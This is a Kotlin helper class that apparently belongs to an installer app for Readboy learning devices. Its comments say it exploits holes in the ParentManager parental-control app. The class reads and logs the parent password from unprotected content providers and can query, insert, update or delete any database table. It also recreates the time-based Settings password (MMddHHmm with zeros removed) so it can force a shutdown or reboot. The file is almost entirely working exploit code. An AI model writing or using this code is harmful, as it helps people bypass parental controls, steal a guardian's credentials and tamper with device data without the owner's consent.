package com.readboy.installer

import android.content.ContentValues
import android.content.Context
import android.content.Intent
import android.database.Cursor
import android.net.Uri
import android.util.Log
import java.text.SimpleDateFormat
import java.util.Calendar
import java.util.Locale

/**
 * ParentManager 辅助类
 * 用于利用 ParentManager 的安全漏洞获取家长密码和访问 SQLite 数据库
 *
 * 安全漏洞参考：ParentManager深度安全漏洞分析报告.md
 * - VULN-001: AppContentProvider 没有权限保护，可以访问 user_info 表
 * - VULN-002: SqliteProvider 没有权限保护，可以查询任意数据库表
 */
object ParentManagerHelper {

    private const val TAG = "ParentManagerHelper"
    private const val AUTHORITY = "com.readboy.parentmanager.AppContentProvider"
    private const val SQLITE_AUTHORITY = "com.readboy.parentmanager.SqliteProvider"
    private const val URI_USER_INFO = "content://$AUTHORITY/user_info"

    /**
     * 读取家长密码
     *
     * @param context 上下文
     * @return 家长密码，如果读取失败返回 null
     */
    fun readParentPassword(context: Context): String? {
        val uri = Uri.parse(URI_USER_INFO)
        var cursor: Cursor? = null

        try {
            Log.d(TAG, "开始读取家长密码...")
            Log.d(TAG, "URI: $uri")

            cursor = context.contentResolver.query(uri, null, null, null, null)

            if (cursor != null) {
                Log.d(TAG, "Cursor 不为空，行数: ${cursor.count}")

                if (cursor.moveToFirst()) {
                    // 获取列数量
                    val columnCount = cursor.columnCount
                    Log.d(TAG, "列数量: $columnCount")

                    // 打印所有列名
                    for (i in 0 until columnCount) {
                        Log.d(TAG, "列 $i: ${cursor.getColumnName(i)}")
                    }

                    // 获取密码（通常在第2列，索引为1）
                    val password = cursor.getString(1)
                    Log.d(TAG, "成功读取家长密码！")
                    Log.d(TAG, "密码: $password")

                    return password
                } else {
                    Log.w(TAG, "Cursor 为空，无法读取数据")
                }
            } else {
                Log.e(TAG, "Cursor 为 null，查询失败")
            }
        } catch (e: SecurityException) {
            Log.e(TAG, "安全异常：没有访问权限", e)
        } catch (e: Exception) {
            Log.e(TAG, "读取家长密码时发生错误", e)
        } finally {
            cursor?.close()
        }

        return null
    }

    /**
     * 读取所有用户信息
     *
     * @param context 上下文
     * @return 用户信息字符串，如果读取失败返回错误信息
     */
    fun readAllUserInfo(context: Context): String {
        val uri = Uri.parse(URI_USER_INFO)
        var cursor: Cursor? = null
        val result = StringBuilder()

        try {
            Log.d(TAG, "开始读取所有用户信息...")
            cursor = context.contentResolver.query(uri, null, null, null, null)

            if (cursor != null) {
                result.append("查询成功，共 ${cursor.count} 行数据\n\n")

                if (cursor.moveToFirst()) {
                    // 打印列名
                    val columnCount = cursor.columnCount
                    for (i in 0 until columnCount) {
                        result.append("${cursor.getColumnName(i)}\t")
                    }
                    result.append("\n")

                    // 打印所有数据
                    do {
                        for (i in 0 until columnCount) {
                            val value = cursor.getString(i)
                            result.append("$value\t")
                        }
                        result.append("\n")
                    } while (cursor.moveToNext())

                    Log.d(TAG, "用户信息读取成功")
                }
            } else {
                result.append("查询失败：Cursor 为 null")
                Log.e(TAG, "Cursor 为 null")
            }
        } catch (e: Exception) {
            result.append("错误: ${e.message}")
            Log.e(TAG, "读取用户信息时发生错误", e)
        } finally {
            cursor?.close()
        }

        return result.toString()
    }

    // ==================== SQLite 访问功能 ====================
    // 基于漏洞 VULN-002: SqliteProvider 没有权限保护

    /**
     * 获取所有表名
     * 通过查询 sqlite_master 表获取所有表名
     *
     * @param context 上下文
     * @return 表名列表
     */
    fun getAllTables(context: Context): List<String> {
        val tables = mutableListOf<String>()
        val uri = Uri.parse("content://$SQLITE_AUTHORITY/sqlite_master")
        var cursor: Cursor? = null

        try {
            Log.d(TAG, "开始获取所有表名...")
            Log.d(TAG, "URI: $uri")

            cursor = context.contentResolver.query(
                uri,
                null,
                "type=?",
                arrayOf("table"),
                "name"
            )

            if (cursor != null) {
                Log.d(TAG, "查询成功，共 ${cursor.count} 个表")

                val nameIndex = cursor.getColumnIndex("name")
                if (nameIndex >= 0) {
                    while (cursor.moveToNext()) {
                        val tableName = cursor.getString(nameIndex)
                        tables.add(tableName)
                        Log.d(TAG, "发现表: $tableName")
                    }
                } else {
                    Log.w(TAG, "无法找到 name 列")
                }
            } else {
                Log.e(TAG, "Cursor 为 null，查询失败")
            }
        } catch (e: Exception) {
            Log.e(TAG, "获取表名时发生错误", e)
        } finally {
            cursor?.close()
        }

        Log.d(TAG, "共找到 ${tables.size} 个表")
        return tables
    }

    /**
     * 查询指定表的所有数据
     *
     * @param context 上下文
     * @param tableName 表名
     * @return 表数据的字符串表示
     */
    fun queryTable(context: Context, tableName: String): String {
        val result = StringBuilder()
        val uri = Uri.parse("content://$SQLITE_AUTHORITY/$tableName")
        var cursor: Cursor? = null

        try {
            Log.d(TAG, "开始查询表: $tableName")
            Log.d(TAG, "URI: $uri")

            cursor = context.contentResolver.query(uri, null, null, null, null)

            if (cursor != null) {
                result.append("查询成功，共 ${cursor.count} 行数据\n\n")

                if (cursor.moveToFirst()) {
                    // 打印列名
                    val columnCount = cursor.columnCount
                    for (i in 0 until columnCount) {
                        result.append("${cursor.getColumnName(i)}\t")
                    }
                    result.append("\n")
                    result.append("-".repeat(columnCount * 20))
                    result.append("\n")

                    // 打印所有数据
                    do {
                        for (i in 0 until columnCount) {
                            val value = try {
                                cursor.getString(i)
                            } catch (e: Exception) {
                                "<无法读取>"
                            }
                            result.append("$value\t")
                        }
                        result.append("\n")
                    } while (cursor.moveToNext())

                    Log.d(TAG, "表 $tableName 查询成功")
                } else {
                    result.append("表为空，没有数据")
                    Log.w(TAG, "表 $tableName 为空")
                }
            } else {
                result.append("查询失败：Cursor 为 null")
                Log.e(TAG, "查询 $tableName 失败：Cursor 为 null")
            }
        } catch (e: SecurityException) {
            result.append("安全异常：${e.message}")
            Log.e(TAG, "安全异常", e)
        } catch (e: Exception) {
            result.append("错误: ${e.message}")
            Log.e(TAG, "查询表 $tableName 时发生错误", e)
        } finally {
            cursor?.close()
        }

        return result.toString()
    }

    /**
     * 向指定表插入数据
     *
     * @param context 上下文
     * @param tableName 表名
     * @param values 要插入的数据（ContentValues）
     * @return 插入行的 ID，如果失败返回 -1
     */
    fun insertData(context: Context, tableName: String, values: ContentValues): Long {
        val uri = Uri.parse("content://$SQLITE_AUTHORITY/$tableName")

        try {
            Log.d(TAG, "开始向表 $tableName 插入数据...")
            Log.d(TAG, "URI: $uri")
            Log.d(TAG, "数据: $values")

            val resultUri = context.contentResolver.insert(uri, values)

            if (resultUri != null) {
                val id = resultUri.lastPathSegment?.toLongOrNull() ?: -1
                Log.d(TAG, "插入成功，ID: $id")
                return id
            } else {
                Log.e(TAG, "插入失败：返回的 URI 为 null")
                return -1
            }
        } catch (e: SecurityException) {
            Log.e(TAG, "安全异常：没有权限插入数据", e)
            return -1
        } catch (e: Exception) {
            Log.e(TAG, "插入数据时发生错误", e)
            return -1
        }
    }

    /**
     * 更新指定表的数据
     *
     * @param context 上下文
     * @param tableName 表名
     * @param values 要更新的数据（ContentValues）
     * @param whereClause WHERE 子句
     * @param whereArgs WHERE 参数
     * @return 受影响的行数
     */
    fun updateData(
        context: Context,
        tableName: String,
        values: ContentValues,
        whereClause: String?,
        whereArgs: Array<String>?
    ): Int {
        val uri = Uri.parse("content://$SQLITE_AUTHORITY/$tableName")

        try {
            Log.d(TAG, "开始更新表 $tableName 的数据...")
            Log.d(TAG, "URI: $uri")
            Log.d(TAG, "数据: $values")
            Log.d(TAG, "WHERE: $whereClause")
            Log.d(TAG, "Args: ${whereArgs?.contentToString()}")

            val rowsAffected = context.contentResolver.update(
                uri,
                values,
                whereClause,
                whereArgs
            )

            Log.d(TAG, "更新成功，受影响的行数: $rowsAffected")
            return rowsAffected
        } catch (e: SecurityException) {
            Log.e(TAG, "安全异常：没有权限更新数据", e)
            return 0
        } catch (e: Exception) {
            Log.e(TAG, "更新数据时发生错误", e)
            return 0
        }
    }

    /**
     * 删除指定表的数据
     *
     * @param context 上下文
     * @param tableName 表名
     * @param whereClause WHERE 子句
     * @param whereArgs WHERE 参数
     * @return 受影响的行数
     */
    fun deleteData(
        context: Context,
        tableName: String,
        whereClause: String?,
        whereArgs: Array<String>?
    ): Int {
        val uri = Uri.parse("content://$SQLITE_AUTHORITY/$tableName")

        try {
            Log.d(TAG, "开始删除表 $tableName 的数据...")
            Log.d(TAG, "URI: $uri")
            Log.d(TAG, "WHERE: $whereClause")
            Log.d(TAG, "Args: ${whereArgs?.contentToString()}")

            val rowsAffected = context.contentResolver.delete(
                uri,
                whereClause,
                whereArgs
            )

            Log.d(TAG, "删除成功，受影响的行数: $rowsAffected")
            return rowsAffected
        } catch (e: SecurityException) {
            Log.e(TAG, "安全异常：没有权限删除数据", e)
            return 0
        } catch (e: Exception) {
            Log.e(TAG, "删除数据时发生错误", e)
            return 0
        }
    }

    // ==================== 关机和重启功能 ====================
    // 基于漏洞 VULN-004: Settings.apk 的强制关机/重启功能

    private const val ACTION_SHUTDOWN_REBOOT = "android.intent.action.ReadboyForceShutdownOrReboot"
    private const val SETTINGS_PACKAGE = "com.android.settings"
    private const val EXTRA_ACTION = "ReadboyForceAction"
    private const val EXTRA_PASSWORD = "pwd"
    private const val ACTION_SHUTDOWN = "shutdown"
    private const val ACTION_REBOOT = "reboot"

    /**
     * 生成动态密码
     * Settings.apk 使用基于时间的动态密码，格式为 MMddHHmm 并移除所有 0
     *
     * 示例：
     * - 时间：2026-02-12 14:45:00
     * - 格式化：02121445（MMddHHmm）
     * - 替换0：2121445
     * - 密码：2121445
     *
     * @return 动态生成的密码
     */
    fun generateDynamicPassword(): String {
        val calendar = Calendar.getInstance()
        val sdf = SimpleDateFormat("MMddHHmm", Locale.getDefault())
        val timeStr = sdf.format(calendar.time)
        val password = timeStr.replace("0", "")
        Log.d(TAG, "生成动态密码 - 时间: $timeStr -> 密码: $password")
        return password
    }

    /**
     * 关机设备
     *
     * @param context 上下文
     * @param password 家长密码
     * @return 是否成功发送关机命令
     */
    fun shutdownDevice(context: Context, password: String): Boolean {
        try {
            Log.d(TAG, "准备关机设备...")
            Log.d(TAG, "密码: $password")

            val intent = Intent().apply {
                action = ACTION_SHUTDOWN_REBOOT
                putExtra(EXTRA_ACTION, ACTION_SHUTDOWN)
                putExtra(EXTRA_PASSWORD, password)
                setPackage(SETTINGS_PACKAGE)
            }

            context.sendBroadcast(intent)
            Log.d(TAG, "关机命令已发送")
            return true
        } catch (e: SecurityException) {
            Log.e(TAG, "安全异常：没有权限发送关机广播", e)
            return false
        } catch (e: Exception) {
            Log.e(TAG, "发送关机命令时发生错误", e)
            return false
        }
    }

    /**
     * 重启设备
     *
     * @param context 上下文
     * @param password 家长密码
     * @return 是否成功发送重启命令
     */
    fun rebootDevice(context: Context, password: String): Boolean {
        try {
            Log.d(TAG, "准备重启设备...")
            Log.d(TAG, "密码: $password")

            val intent = Intent().apply {
                action = ACTION_SHUTDOWN_REBOOT
                putExtra(EXTRA_ACTION, ACTION_REBOOT)
                putExtra(EXTRA_PASSWORD, password)
                setPackage(SETTINGS_PACKAGE)
            }

            context.sendBroadcast(intent)
            Log.d(TAG, "重启命令已发送")
            return true
        } catch (e: SecurityException) {
            Log.e(TAG, "安全异常：没有权限发送重启广播", e)
            return false
        } catch (e: Exception) {
            Log.e(TAG, "发送重启命令时发生错误", e)
            return false
        }
    }

    /**
     * 自动获取密码后关机
     * 使用动态密码（基于时间的密码）而不是从 ParentManager 读取的固定密码
     *
     * @param context 上下文
     * @return 是否成功发送关机命令
     */
    fun shutdownWithAutoPassword(context: Context): Boolean {
        Log.d(TAG, "准备自动获取密码并关机...")

        // 使用动态密码生成
        val password = generateDynamicPassword()

        Log.d(TAG, "成功生成动态密码: $password，准备关机")
        return shutdownDevice(context, password)
    }

    /**
     * 自动获取密码后重启
     * 使用动态密码（基于时间的密码）而不是从 ParentManager 读取的固定密码
     *
     * @param context 上下文
     * @return 是否成功发送重启命令
     */
    fun rebootWithAutoPassword(context: Context): Boolean {
        Log.d(TAG, "准备自动获取密码并重启...")

        // 使用动态密码生成
        val password = generateDynamicPassword()

        Log.d(TAG, "成功生成动态密码: $password，准备重启")
        return rebootDevice(context, password)
    }
}
